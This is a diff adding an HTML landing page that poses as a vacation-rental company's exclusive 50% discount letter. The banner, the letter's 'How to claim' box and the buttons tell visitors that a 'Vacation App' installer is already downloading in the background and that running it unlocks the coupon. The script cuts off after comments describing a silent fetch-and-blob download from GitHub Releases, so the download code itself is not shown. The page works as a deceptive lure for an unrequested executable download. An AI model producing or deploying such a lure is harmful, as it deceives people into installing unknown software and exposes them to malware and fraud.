@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Exclusive Vacation Offer — 50% Off | Évasion Villas</title>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400;1,500&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+<style>
+  :root {
+    --midnight: #08121E;
+    --deep: #0F1E30;
+    --sand: #E8D5B7;
+    --sand-pale: #F7F3EE;
+    --coral: #C9956A;
+    --coral-light: #E0B08A;
+    --teal: #4ECDC4;
+    --white: #FFFFFF;
+    --text-body: #3A3028;
+    --text-muted: #7A6B5E;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'DM Sans', sans-serif;
+    background: var(--midnight);
+    color: var(--sand-pale);
+    overflow-x: hidden;
+  }
+
+  /* ─── DOWNLOAD BANNER ─────────────────────────── */
+  .download-banner {
+    background: linear-gradient(135deg, #0F2A2A 0%, #0A1E1C 100%);
+    border-bottom: 1px solid rgba(78, 205, 196, 0.3);
+    padding: 0.85rem 1rem;
+    text-align: center;
+    position: relative;
+    z-index: 1000;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem 1.2rem;
+    font-size: 0.85rem;
+    color: var(--sand-pale);
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  }
+  .download-banner .dl-badge {
+    background: rgba(78, 205, 196, 0.15);
+    color: var(--teal);
+    border: 1px solid rgba(78, 205, 196, 0.4);
+    padding: 0.25rem 0.8rem;
+    border-radius: 30px;
+    font-weight: 500;
+    font-size: 0.7rem;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+  .download-banner .dl-text { font-weight: 300; color: rgba(247, 243, 238, 0.9); }
+  .download-banner .dl-text strong { color: var(--coral-light); font-weight: 500; }
+  .download-banner .dl-btn {
+    background: linear-gradient(135deg, #C9956A 0%, #A07040 100%);
+    color: #fff; border: none; padding: 0.45rem 1.4rem; border-radius: 40px;
+    font-size: 0.72rem; font-weight: 500; letter-spacing: 0.12em; text-transform: uppercase;
+    cursor: pointer; transition: transform 0.2s ease, box-shadow 0.2s ease;
+    box-shadow: 0 2px 12px rgba(201,149,106,0.4); white-space: nowrap;
+  }
+  .download-banner .dl-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 18px rgba(201,149,106,0.6); }
+  .download-banner .dl-btn:disabled { opacity: 0.55; cursor: wait; }
+
+  /* ─── HERO ─────────────────────────────────────── */
+  .hero { position: relative; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+  .hero-bg {
+    position: absolute; inset: 0;
+    background: radial-gradient(ellipse 80% 50% at 50% 0%, #1A3A5C 0%, transparent 60%),
+                linear-gradient(180deg, #0D2137 0%, #0A1628 40%, #061018 100%);
+  }
+  .stars { position: absolute; inset: 0; overflow: hidden; pointer-events: none; }
+  .star {
+    position: absolute; width: 2px; height: 2px; border-radius: 50%;
+    background: rgba(255,255,255,0.6);
+    animation: twinkle var(--d, 3s) ease-in-out infinite var(--delay, 0s);
+  }
+  @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+
+  .moon {
+    position: absolute; top: 8%; right: 12%; width: 80px; height: 80px; border-radius: 50%;
+    background: radial-gradient(circle at 35% 35%, #FFF8E7, #F0D090 50%, #D4A843);
+    box-shadow: 0 0 40px 15px rgba(240,208,144,0.25), 0 0 80px 30px rgba(240,208,144,0.1);
+  }
+  .landscape { position: absolute; bottom: 0; left: 0; right: 0; height: 55%; pointer-events: none; }
+
+  .water {
+    position: absolute; bottom: 0; left: 0; right: 0; height: 22%;
+    background: linear-gradient(180deg, rgba(78,205,196,0.08) 0%, rgba(78,205,196,0.15) 50%, rgba(10,22,40,0.9) 100%);
+    overflow: hidden;
+  }
+  .water::before {
+    content: ''; position: absolute; top: 0; left: -50%; width: 200%; height: 2px;
+    background: linear-gradient(90deg, transparent, rgba(78,205,196,0.4), rgba(201,149,106,0.4), transparent);
+    animation: ripple 6s ease-in-out infinite;
+  }
+  .water::after {
+    content: ''; position: absolute; top: 8px; left: -50%; width: 200%; height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(78,205,196,0.2), transparent);
+    animation: ripple 8s ease-in-out infinite reverse;
+  }
+  @keyframes ripple { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(10%); } }
+
+  .hero-content { position: relative; z-index: 10; text-align: center; padding: 2rem 1rem; }
+  .hero-eyebrow {
+    font-size: 0.75rem; letter-spacing: 0.25em; color: var(--teal);
+    text-transform: uppercase; margin-bottom: 1.5rem;
+    opacity: 0; animation: fadeUp 0.8s ease 0.3s forwards;
+  }
+  .hero-title {
+    font-family: 'Cormorant Garamond', serif; font-weight: 300;
+    font-size: clamp(3.5rem, 10vw, 8rem); line-height: 0.9;
+    color: var(--sand-pale); margin-bottom: 0.5rem;
+    opacity: 0; animation: fadeUp 0.9s ease 0.5s forwards;
+  }
+  .hero-title em { display: block; font-style: italic; font-weight: 300; color: var(--coral-light); }
+
+  .discount-badge {
+    display: inline-flex; align-items: center; justify-content: center;
+    margin: 2rem auto; width: 140px; height: 140px; border-radius: 50%;
+    background: conic-gradient(from 180deg, var(--coral) 0%, var(--coral-light) 50%, var(--coral) 100%);
+    box-shadow: 0 0 50px rgba(201,149,106,0.4), 0 0 100px rgba(201,149,106,0.15), inset 0 0 30px rgba(255,255,255,0.1);
+    flex-direction: column;
+    animation: fadeUp 1s ease 0.7s forwards, pulse-glow 4s ease-in-out 1.7s infinite;
+    opacity: 0;
+  }
+  @keyframes pulse-glow {
+    0%, 100% { box-shadow: 0 0 50px rgba(201,149,106,0.4), 0 0 100px rgba(201,149,106,0.15); }
+    50% { box-shadow: 0 0 70px rgba(201,149,106,0.6), 0 0 130px rgba(201,149,106,0.25); }
+  }
+  .discount-num { font-family: 'Cormorant Garamond', serif; font-size: 3.2rem; font-weight: 600; color: var(--white); line-height: 1; }
+  .discount-off { font-size: 0.75rem; font-weight: 500; letter-spacing: 0.15em; color: rgba(255,255,255,0.85); }
+
+  .hero-sub {
+    font-family: 'Cormorant Garamond', serif; font-size: clamp(1rem, 2.5vw, 1.3rem);
+    font-weight: 300; font-style: italic; color: rgba(232,213,183,0.75);
+    margin-top: 0.5rem; opacity: 0; animation: fadeUp 0.8s ease 0.9s forwards;
+  }
+
+  .scroll-cue {
+    position: absolute; bottom: 2.5rem; left: 50%; transform: translateX(-50%);
+    display: flex; flex-direction: column; align-items: center; gap: 6px;
+    opacity: 0; animation: fadeUp 1s ease 1.5s forwards; z-index: 10;
+  }
+  .scroll-cue span { font-size: 0.65rem; letter-spacing: 0.2em; color: rgba(255,255,255,0.4); text-transform: uppercase; }
+  .scroll-cue-line {
+    width: 1px; height: 40px;
+    background: linear-gradient(to bottom, rgba(78,205,196,0.6), transparent);
+    animation: scroll-pulse 2s ease-in-out infinite;
+  }
+  @keyframes scroll-pulse { 0%, 100% { transform: scaleY(1); opacity: 1; } 50% { transform: scaleY(0.6); opacity: 0.4; } }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(24px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* ─── VILLAS STRIP ─────────────────────────────── */
+  .villas-section { background: var(--deep); padding: 0; overflow: hidden; }
+  .villas-label {
+    text-align: center; padding: 4rem 1rem 2rem;
+    font-size: 0.72rem; letter-spacing: 0.28em; color: var(--teal); text-transform: uppercase;
+  }
+  .villa-strip { display: grid; grid-template-columns: repeat(4, 1fr); height: 320px; }
+  @media (max-width: 768px) { .villa-strip { grid-template-columns: repeat(2, 1fr); height: auto; } .villa-card { height: 220px; } }
+  @media (max-width: 480px) { .villa-strip { grid-template-columns: 1fr; } }
+
+  .villa-card { position: relative; overflow: hidden; cursor: pointer; }
+  .villa-card::after {
+    content: ''; position: absolute; inset: 0;
+    background: linear-gradient(to top, rgba(8,18,30,0.85) 0%, rgba(8,18,30,0.1) 50%, transparent 100%);
+    transition: opacity 0.4s ease;
+  }
+  .villa-card:hover::after { opacity: 0.6; }
+  .villa-bg { position: absolute; inset: 0; transition: transform 0.6s cubic-bezier(0.25,0.46,0.45,0.94); }
+  .villa-card:hover .villa-bg { transform: scale(1.06); }
+
+  .villa-1 .villa-bg { background: radial-gradient(ellipse 60% 40% at 50% 100%, rgba(78,205,196,0.2) 0%, transparent 70%), linear-gradient(160deg, #1A3A2A 0%, #0D2518 50%, #0A1E14 100%); }
+  .villa-2 .villa-bg { background: radial-gradient(ellipse 70% 50% at 30% 90%, rgba(201,149,106,0.3) 0%, transparent 60%), linear-gradient(135deg, #2A1A10 0%, #1E1208 60%, #150D05 100%); }
+  .villa-3 .villa-bg { background: radial-gradient(ellipse 80% 40% at 70% 100%, rgba(78,100,205,0.25) 0%, transparent 60%), linear-gradient(150deg, #121A2A 0%, #0C1420 60%, #060E18 100%); }
+  .villa-4 .villa-bg { background: radial-gradient(ellipse 60% 50% at 50% 90%, rgba(201,149,106,0.2) 0%, transparent 60%), linear-gradient(140deg, #1E1A0A 0%, #151208 60%, #0E0D05 100%); }
+
+  .villa-svg { position: absolute; bottom: 0; left: 0; right: 0; z-index: 1; width: 100%; }
+  .villa-info { position: absolute; bottom: 0; left: 0; right: 0; padding: 1.25rem; z-index: 2; }
+  .villa-name { font-family: 'Cormorant Garamond', serif; font-size: 1.1rem; font-weight: 400; color: var(--sand-pale); display: block; margin-bottom: 2px; }
+  .villa-loc { font-size: 0.65rem; letter-spacing: 0.15em; text-transform: uppercase; color: var(--teal); display: flex; align-items: center; gap: 4px; }
+
+  /* ─── LETTER ───────────────────────────────────── */
+  .letter-section { background: var(--midnight); padding: 6rem 1rem; position: relative; overflow: hidden; }
+  .letter-section::before {
+    content: ''; position: absolute; top: -100px; left: 50%; transform: translateX(-50%);
+    width: 600px; height: 600px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(78,205,196,0.04) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .letter-wrapper { max-width: 640px; margin: 0 auto; position: relative; }
+  .letter-corner { position: absolute; width: 24px; height: 24px; border-color: var(--coral); border-style: solid; opacity: 0.5; }
+  .letter-corner.tl { top: -16px; left: -16px; border-width: 1px 0 0 1px; }
+  .letter-corner.tr { top: -16px; right: -16px; border-width: 1px 1px 0 0; }
+  .letter-corner.bl { bottom: -16px; left: -16px; border-width: 0 0 1px 1px; }
+  .letter-corner.br { bottom: -16px; right: -16px; border-width: 0 1px 1px 0; }
+
+  .letter-card {
+    background: var(--sand-pale); border-radius: 2px; padding: 3.5rem 3rem 3rem;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.3), 0 20px 60px rgba(0,0,0,0.5), 0 60px 120px rgba(0,0,0,0.4);
+    position: relative; overflow: hidden;
+  }
+  .letter-card::before {
+    content: '50%'; position: absolute; top: 50%; left: 50%;
+    transform: translate(-50%, -50%) rotate(-15deg);
+    font-family: 'Cormorant Garamond', serif; font-size: 20rem; font-weight: 600;
+    color: rgba(201,149,106,0.04); pointer-events: none; white-space: nowrap; line-height: 1;
+  }
+  .letterhead {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 2.5rem; padding-bottom: 1.5rem; border-bottom: 1px solid rgba(58,48,40,0.12);
+  }
+  .brand-mark { display: flex; flex-direction: column; }
+  .brand-name { font-family: 'Cormorant Garamond', serif; font-size: 1.4rem; font-weight: 500; color: var(--text-body); letter-spacing: 0.05em; line-height: 1; }
+  .brand-tagline { font-size: 0.6rem; letter-spacing: 0.22em; text-transform: uppercase; color: var(--text-muted); margin-top: 2px; }
+  .letterhead-seal {
+    width: 44px; height: 44px; border-radius: 50%; border: 1.5px solid rgba(201,149,106,0.5);
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'Cormorant Garamond', serif; font-size: 1.1rem; font-style: italic;
+    color: var(--text-body); opacity: 0.6;
+  }
+  .letter-date { font-size: 0.72rem; color: var(--text-muted); margin-bottom: 1.5rem; letter-spacing: 0.05em; }
+  .letter-salutation { font-family: 'Cormorant Garamond', serif; font-size: 1.2rem; font-weight: 400; color: var(--text-body); margin-bottom: 1.5rem; }
+  .letter-body { font-family: 'Cormorant Garamond', serif; font-size: 1.08rem; font-weight: 400; line-height: 1.85; color: var(--text-body); margin-bottom: 1.5rem; }
+  .letter-body p { margin-bottom: 1.2rem; }
+  .letter-body p:last-child { margin-bottom: 0; }
+  .offer-inline { display: inline-block; background: linear-gradient(135deg, #C9956A 0%, #E0B08A 100%); color: white; padding: 0.1em 0.4em; border-radius: 2px; font-weight: 500; }
+  .date-pill { display: inline-block; background: rgba(201,149,106,0.1); border: 1px solid rgba(201,149,106,0.3); color: #8B5E3C; padding: 0.2em 0.6em; border-radius: 20px; font-size: 0.9em; font-style: normal; white-space: nowrap; }
+
+  .letter-sign { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(58,48,40,0.1); }
+  .sign-thanks { font-family: 'Cormorant Garamond', serif; font-size: 1rem; font-weight: 400; color: var(--text-body); margin-bottom: 0.4rem; }
+  .sign-name { font-family: 'Cormorant Garamond', serif; font-size: 1.5rem; font-style: italic; font-weight: 300; color: var(--text-body); opacity: 0.6; }
+
+  .cta-row { margin-top: 2.5rem; text-align: center; }
+  .cta-btn {
+    display: inline-block; font-family: 'DM Sans', sans-serif; font-size: 0.78rem; font-weight: 500;
+    letter-spacing: 0.18em; text-transform: uppercase; color: var(--white);
+    background: linear-gradient(135deg, #C9956A 0%, #A07040 100%);
+    padding: 1rem 2.5rem; border-radius: 2px; text-decoration: none;
+    position: relative; overflow: hidden;
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+    box-shadow: 0 4px 20px rgba(201,149,106,0.3);
+    border: none; cursor: pointer;
+  }
+  .cta-btn::before {
+    content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+    transition: left 0.4s ease;
+  }
+  .cta-btn:hover::before { left: 100%; }
+  .cta-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(201,149,106,0.45); color: var(--white); }
+  .cta-btn:disabled { opacity: 0.6; cursor: wait; }
+  .cta-subtext { font-size: 0.65rem; color: var(--text-muted); letter-spacing: 0.08em; margin-top: 0.75rem; text-align: center; min-height: 1em; }
+
+  /* ─── DATES ────────────────────────────────────── */
+  .dates-band {
+    background: linear-gradient(135deg, var(--deep) 0%, #0A1826 100%);
+    padding: 4rem 1rem; text-align: center; position: relative; overflow: hidden;
+  }
+  .dates-band::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(78,205,196,0.3), rgba(201,149,106,0.3), transparent); }
+  .dates-band::after { content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(78,205,196,0.2), transparent); }
+  .dates-label { font-size: 0.65rem; letter-spacing: 0.28em; text-transform: uppercase; color: var(--teal); margin-bottom: 1.5rem; }
+  .dates-display { font-family: 'Cormorant Garamond', serif; font-size: clamp(1.6rem, 5vw, 3rem); font-weight: 300; color: var(--sand); line-height: 1.3; }
+  .dates-sep { display: inline-block; margin: 0 1.5rem; color: var(--coral); font-style: italic; }
+  .dates-note { font-size: 0.75rem; color: rgba(232,213,183,0.45); margin-top: 1rem; letter-spacing: 0.08em; }
+
+  /* ─── FOOTER ───────────────────────────────────── */
+  .site-footer { background: var(--midnight); padding: 3rem 1rem 2rem; text-align: center; border-top: 1px solid rgba(255,255,255,0.04); }
+  .footer-brand { font-family: 'Cormorant Garamond', serif; font-size: 1.5rem; font-weight: 300; color: rgba(232,213,183,0.4); letter-spacing: 0.1em; margin-bottom: 0.75rem; }
+  .footer-line { font-size: 0.65rem; color: rgba(255,255,255,0.2); letter-spacing: 0.1em; }
+
+  @media (max-width: 600px) {
+    .letter-card { padding: 2rem 1.5rem 2rem; }
+    .letterhead { flex-direction: column; gap: 1rem; align-items: flex-start; }
+    .dates-sep { display: block; margin: 0.3rem 0; }
+    .download-banner { flex-direction: column; gap: 0.5rem; font-size: 0.78rem; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation-duration: 0.001ms !important; animation-iteration-count: 1 !important; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ══ DOWNLOAD BANNER ══════════════════════════════ -->
+<div class="download-banner" role="status" aria-live="polite">
+  <span class="dl-badge">★ Top 1% Quality Homes</span>
+  <span class="dl-text">Your <strong>Vacation App</strong> installer downloads in the background — this page stays put. Open the app to unlock your <strong>50% discount coupon code</strong>.</span>
+  <button class="dl-btn" id="manualDownloadBtn" type="button">Download now</button>
+</div>
+
+<!-- ══ HERO ══════════════════════════════════════════ -->
+<section class="hero">
+  <div class="hero-bg"></div>
+  <div class="stars" id="stars"></div>
+  <div class="moon"></div>
+
+  <svg class="landscape" viewBox="0 0 1440 500" preserveAspectRatio="xMidYMax slice" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 400 L120 240 L200 310 L320 180 L440 290 L560 200 L650 280 L720 160 L800 250 L900 190 L1000 280 L1100 170 L1200 260 L1320 180 L1440 240 L1440 500 L0 500Z" fill="rgba(15,30,48,0.9)"/>
+    <path d="M0 420 L80 300 L160 360 L260 260 L380 340 L500 270 L620 350 L720 240 L840 320 L960 260 L1060 340 L1180 250 L1300 320 L1440 270 L1440 500 L0 500Z" fill="rgba(10,22,36,0.95)"/>
+    <g fill="rgba(8,18,30,1)">
+      <rect x="80" y="350" width="120" height="80" rx="1"/>
+      <polygon points="80,350 140,290 200,350"/>
+      <rect x="110" y="370" width="20" height="30"/>
+      <rect x="150" y="370" width="20" height="30"/>
+      <rect x="130" y="355" width="20" height="12" fill="rgba(201,149,106,0.3)"/>
+      <rect x="230" y="340" width="6" height="80"/>
+      <ellipse cx="233" cy="338" rx="25" ry="12" transform="rotate(-15,233,338)" fill="rgba(8,18,30,1)"/>
+      <ellipse cx="233" cy="338" rx="22" ry="10" transform="rotate(10,233,338)"/>
+      <ellipse cx="233" cy="338" rx="20" ry="9" transform="rotate(35,233,338)"/>
+      <ellipse cx="233" cy="338" rx="18" ry="8" transform="rotate(-40,233,338)"/>
+    </g>
+    <g fill="rgba(8,18,30,1)">
+      <rect x="1200" y="340" width="140" height="90" rx="1"/>
+      <polygon points="1200,340 1270,275 1340,340"/>
+      <rect x="1230" y="360" width="22" height="35"/>
+      <rect x="1270" y="360" width="22" height="35"/>
+      <rect x="1248" y="343" width="24" height="13" fill="rgba(78,205,196,0.2)"/>
+      <rect x="1380" y="340" width="6" height="90"/>
+      <ellipse cx="1383" cy="338" rx="25" ry="12" transform="rotate(20,1383,338)"/>
+      <ellipse cx="1383" cy="338" rx="22" ry="10" transform="rotate(-15,1383,338)"/>
+      <ellipse cx="1383" cy="338" rx="20" ry="9" transform="rotate(42,1383,338)"/>
+      <ellipse cx="1383" cy="338" rx="18" ry="8" transform="rotate(-38,1383,338)"/>
+    </g>
+    <g fill="rgba(8,18,30,0.95)">
+      <rect x="650" y="380" width="140" height="70" rx="1"/>
+      <polygon points="650,380 720,330 790,380"/>
+      <rect x="680" y="398" width="18" height="28"/>
+      <rect x="722" y="398" width="18" height="28"/>
+    </g>
+    <rect x="0" y="440" width="1440" height="60" fill="rgba(8,18,30,1)"/>
+    <line x1="0" y1="445" x2="1440" y2="445" stroke="rgba(78,205,196,0.12)" stroke-width="1"/>
+    <line x1="100" y1="452" x2="600" y2="452" stroke="rgba(201,149,106,0.1)" stroke-width="1"/>
+    <line x1="800" y1="455" x2="1300" y2="455" stroke="rgba(78,205,196,0.08)" stroke-width="1"/>
+    <ellipse cx="1310" cy="470" rx="40" ry="8" fill="rgba(240,208,144,0.08)"/>
+  </svg>
+
+  <div class="water"></div>
+
+  <div class="hero-content">
+    <p class="hero-eyebrow">Exclusive Renter Offer · Top 1%</p>
+    <h1 class="hero-title">Dream<br><em>Escapes</em></h1>
+    <div class="discount-badge">
+      <span class="discount-num">50%</span>
+      <span class="discount-off">Off</span>
+    </div>
+    <p class="hero-sub">Your next vacation, at half the price — only in the app</p>
+  </div>
+
+  <div class="scroll-cue">
+    <span>Scroll</span>
+    <div class="scroll-cue-line"></div>
+  </div>
+</section>
+
+<!-- ══ VILLAS STRIP ══════════════════════════════════ -->
+<section class="villas-section">
+  <p class="villas-label">Featured Properties — Top 1% Selection</p>
+  <div class="villa-strip">
+    <div class="villa-card villa-1">
+      <div class="villa-bg"></div>
+      <svg class="villa-svg" viewBox="0 0 400 180" preserveAspectRatio="xMidYMax meet" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 180 L0 90 L60 90 L60 70 L80 50 L100 70 L100 90 L140 90 L140 70 L150 55 L160 70 L160 90 L200 90 L200 75 L220 55 L240 75 L240 90 L400 90 L400 180Z" fill="rgba(8,18,30,0.8)"/>
+        <rect x="80" y="95" width="30" height="85" fill="rgba(8,18,30,0.9)"/>
+        <rect x="90" y="100" width="10" height="20" fill="rgba(78,205,196,0.3)"/>
+        <rect x="310" y="80" width="4" height="100" fill="rgba(20,40,25,0.9)"/>
+        <ellipse cx="312" cy="78" rx="30" ry="10" transform="rotate(15,312,78)" fill="rgba(20,50,25,0.8)"/>
+        <ellipse cx="312" cy="78" rx="28" ry="9" transform="rotate(-20,312,78)" fill="rgba(20,50,25,0.8)"/>
+        <ellipse cx="312" cy="78" rx="25" ry="8" transform="rotate(40,312,78)" fill="rgba(15,40,20,0.8)"/>
+      </svg>
+      <div class="villa-info">
+        <span class="villa-name">Villa Serenita</span>
+        <span class="villa-loc">
+          <svg width="8" height="8" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="4" r="2.5" stroke="currentColor" stroke-width="1.2"/><path d="M5 7 L5 10" stroke="currentColor" stroke-width="1.2"/></svg>
+          Tuscany, Italy
+        </span>
+      </div>
+    </div>
+
+    <div class="villa-card villa-2">
+      <div class="villa-bg"></div>
+      <svg class="villa-svg" viewBox="0 0 400 180" preserveAspectRatio="xMidYMax meet" xmlns="http://www.w3.org/2000/svg">
+        <rect x="40" y="80" width="200" height="100" fill="rgba(30,15,8,0.85)"/>
+        <rect x="40" y="60" width="120" height="22" fill="rgba(30,15,8,0.85)"/>
+        <rect x="80" y="90" width="30" height="50" fill="rgba(201,149,106,0.15)"/>
+        <rect x="130" y="90" width="30" height="50" fill="rgba(201,149,106,0.1)"/>
+        <rect x="300" y="90" width="8" height="90" fill="rgba(20,30,15,0.9)"/>
+        <rect x="300" y="110" width="25" height="6" rx="3" fill="rgba(20,30,15,0.9)"/>
+        <rect x="275" y="100" width="6" height="40" rx="3" fill="rgba(20,30,15,0.9)"/>
+        <ellipse cx="160" cy="175" rx="70" ry="6" fill="rgba(78,205,196,0.12)"/>
+      </svg>
+      <div class="villa-info">
+        <span class="villa-name">Casa del Sol</span>
+        <span class="villa-loc">
+          <svg width="8" height="8" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="4" r="2.5" stroke="currentColor" stroke-width="1.2"/><path d="M5 7 L5 10" stroke="currentColor" stroke-width="1.2"/></svg>
+          Marrakech, Morocco
+        </span>
+      </div>
+    </div>
+
+    <div class="villa-card villa-3">
+      <div class="villa-bg"></div>
+      <svg class="villa-svg" viewBox="0 0 400 180" preserveAspectRatio="xMidYMax meet" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 180 L0 120 L80 100 L100 80 L150 90 L180 70 L220 85 L260 65 L310 80 L360 70 L400 85 L400 180Z" fill="rgba(10,15,30,0.8)"/>
+        <rect x="100" y="80" width="50" height="60" fill="rgba(240,245,255,0.07)"/>
+        <rect x="180" y="70" width="60" height="70" fill="rgba(240,245,255,0.06)"/>
+        <rect x="260" y="65" width="45" height="75" fill="rgba(240,245,255,0.07)"/>
+        <rect x="110" y="88" width="12" height="10" fill="rgba(201,149,106,0.3)"/>
+        <rect x="192" y="80" width="12" height="10" fill="rgba(78,205,196,0.2)"/>
+        <rect x="272" y="76" width="12" height="10" fill="rgba(201,149,106,0.25)"/>
+        <path d="M180 70 Q205 50 230 70" fill="rgba(78,100,180,0.3)" stroke="rgba(78,100,180,0.4)" stroke-width="1"/>
+      </svg>
+      <div class="villa-info">
+        <span class="villa-name">Aegean Cliffs</span>
+        <span class="villa-loc">
+          <svg width="8" height="8" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="4" r="2.5" stroke="currentColor" stroke-width="1.2"/><path d="M5 7 L5 10" stroke="currentColor" stroke-width="1.2"/></svg>
+          Santorini, Greece
+        </span>
+      </div>
+    </div>
+
+    <div class="villa-card villa-4">
+      <div class="villa-bg"></div>
+      <svg class="villa-svg" viewBox="0 0 400 180" preserveAspectRatio="xMidYMax meet" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 180 L0 150 L400 140 L400 180Z" fill="rgba(15,25,20,0.9)"/>
+        <rect x="130" y="90" width="140" height="70" fill="rgba(20,15,8,0.85)"/>
+        <polygon points="110,92 200,50 290,92" fill="rgba(50,35,15,0.9)"/>
+        <line x1="110" y1="92" x2="290" y2="92" stroke="rgba(80,55,20,0.5)" stroke-width="2"/>
+        <line x1="130" y1="82" x2="270" y2="82" stroke="rgba(80,55,20,0.4)" stroke-width="1"/>
+        <line x1="150" y1="72" x2="250" y2="72" stroke="rgba(80,55,20,0.3)" stroke-width="1"/>
+        <rect x="150" y="160" width="8" height="20" fill="rgba(20,15,8,0.8)"/>
+        <rect x="242" y="160" width="8" height="20" fill="rgba(20,15,8,0.8)"/>
+        <rect x="118" y="155" width="164" height="6" fill="rgba(30,22,10,0.7)"/>
+        <ellipse cx="200" cy="172" rx="120" ry="8" fill="rgba(78,205,196,0.1)"/>
+        <rect x="50" y="85" width="5" height="95" fill="rgba(20,40,20,0.9)"/>
+        <ellipse cx="52" cy="83" rx="28" ry="9" transform="rotate(20,52,83)" fill="rgba(15,40,15,0.9)"/>
+        <ellipse cx="52" cy="83" rx="25" ry="8" transform="rotate(-15,52,83)" fill="rgba(15,40,15,0.9)"/>
+        <ellipse cx="52" cy="83" rx="22" ry="7" transform="rotate(42,52,83)" fill="rgba(12,35,12,0.9)"/>
+      </svg>
+      <div class="villa-info">
+        <span class="villa-name">Bora Palms</span>
+        <span class="villa-loc">
+          <svg width="8" height="8" viewBox="0 0 10 10" fill="none"><circle cx="5" cy="4" r="2.5" stroke="currentColor" stroke-width="1.2"/><path d="M5 7 L5 10" stroke="currentColor" stroke-width="1.2"/></svg>
+          Bora Bora, French Polynesia
+        </span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ DATES BAND ═════════════════════════════════════ -->
+<section class="dates-band">
+  <p class="dates-label">Offer Valid For</p>
+  <div class="dates-display">
+    <span>1 December 2026</span>
+    <span class="dates-sep">—</span>
+    <span>31 August 2027</span>
+  </div>
+  <p class="dates-note">All properties · All room categories · No blackout dates</p>
+</section>
+
+<!-- ══ LETTER ════════════════════════════════════════ -->
+<section class="letter-section">
+  <div class="letter-wrapper">
+    <div class="letter-corner tl"></div>
+    <div class="letter-corner tr"></div>
+    <div class="letter-corner bl"></div>
+    <div class="letter-corner br"></div>
+
+    <div class="letter-card">
+      <div class="letterhead">
+        <div class="brand-mark">
+          <span class="brand-name">Évasion Villas</span>
+          <span class="brand-tagline">Private Vacation Rentals · Top 1%</span>
+        </div>
+        <div class="letterhead-seal">ÉV</div>
+      </div>
+
+      <p class="letter-date">November 2026</p>
+      <p class="letter-salutation">Dear Renter,</p>
+
+      <div class="letter-body">
+        <p>
+          We are pleased to offer you an exclusive <span class="offer-inline">50% discount</span> on your next vacation — a gesture of appreciation reserved for guests who have made these homes their own.
+        </p>
+        <p>
+          This offer applies to all our properties across all available dates from
+          <span class="date-pill">1 December 2026</span> through <span class="date-pill">31 August 2027</span>,
+          giving you an entire season to plan the escape you deserve.
+        </p>
+        <p>
+          Whether you are drawn to the terraces of Tuscany, the whitewashed cliffs of Santorini, the golden dunes of Marrakech, or the still lagoons of Bora Bora — your preferred dates, rates, and availability are waiting for you inside the Vacation App.
+        </p>
+        <p style="font-size: 0.95rem; background: rgba(201,149,106,0.08); padding: 0.75rem 1rem; border-left: 3px solid #C9956A; margin-top: 1rem;">
+          <strong>How to claim:</strong> The installer is downloading in the background — <strong>this page stays open</strong>. Run the app, sign in, and your <strong>50% coupon code</strong> is applied automatically at checkout. Browse hundreds of Top 1% homes with verified quality.
+        </p>
+      </div>
+
+      <div class="cta-row">
+        <button class="cta-btn" id="letterDownloadBtn" type="button">Download Vacation App &amp; Unlock 50%</button>
+        <p class="cta-subtext" id="downloadStatus">Preparing download…</p>
+      </div>
+
+      <div class="letter-sign">
+        <p class="sign-thanks">With warm regards,</p>
+        <p class="sign-name">The Évasion Villas Team</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ FOOTER ════════════════════════════════════════ -->
+<footer class="site-footer">
+  <p class="footer-brand">Évasion Villas</p>
+  <p class="footer-line">© 2026 · Exclusive Vacation Rentals · Top 1% Homes · Unsubscribe</p>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+  // ── BACKGROUND DOWNLOAD (fetch + blob — NO NAVIGATION) ──
+  // GitHub Releases send CORS + Content-Disposition: attachment,
+  // so fetch() works and the blob download keeps the page where it is.
